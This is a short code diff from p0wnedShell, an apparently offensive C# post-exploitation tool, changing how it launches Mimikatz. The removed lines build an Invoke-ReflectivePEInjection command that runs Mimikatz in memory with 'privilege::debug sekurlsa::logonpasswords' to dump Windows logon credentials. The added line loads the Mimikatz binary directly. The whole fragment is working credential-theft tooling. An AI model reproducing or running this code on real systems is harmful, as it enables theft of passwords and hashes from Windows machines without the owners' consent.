@@ -118,16 +118,8 @@ namespace p0wnedShell
             Program.PrintBanner(toPrint);
 
             Console.WriteLine("[+] Please wait until loaded...\n");
+            BinaryLoader.LoadBinary(Binaries.Mimikatz());
 
-            string InvokeMimikatz = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.Mimikatz() + "\" -split ' ') -ExeArgs \"privilege::debug sekurlsa::logonpasswords\" -ForceASLR";
-            try
-            {
-                P0wnedListener.Execute(InvokeMimikatz);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
             return;
         }
 
